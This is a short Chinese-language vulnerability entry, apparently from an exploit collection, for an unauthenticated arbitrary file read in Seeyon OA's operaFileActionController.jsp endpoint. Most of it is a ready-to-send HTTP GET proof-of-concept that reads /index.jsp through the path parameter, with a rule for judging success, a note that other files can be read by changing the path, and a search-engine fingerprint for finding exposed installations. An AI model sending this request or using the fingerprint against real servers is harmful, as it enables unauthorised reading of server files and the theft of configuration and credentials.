---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 致远OA yyoa operaFileActionController.jsp 任意文件读取漏洞

## 漏洞描述

致远OA 的 `/yyoa/portal/style/controller/operaFileActionController.jsp` 接口通过 `path` 参数读取文件且未做有效鉴权，攻击者可未授权读取服务器上的任意文件内容。

## 漏洞复现

```
GET /yyoa/portal/style/controller/operaFileActionController.jsp?path=/index.jsp&fileop=find HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
```

响应状态码为 200，且响应体中包含文件内容（PoC 以读取 `/index.jsp` 为例，响应包含 `IP` 特征时判定存在漏洞）即存在漏洞；修改 `path` 参数可读取其他文件。

## 网络测绘

```
app="致远互联-OA"
```

## 参考链接

- 利用细节依据 R4gd0ll/I-Wanna-Get-All 历史提交 `d8b866a` 中 `seeyon_yyoa_operaFile_FileRead` 的 PoC 逻辑。
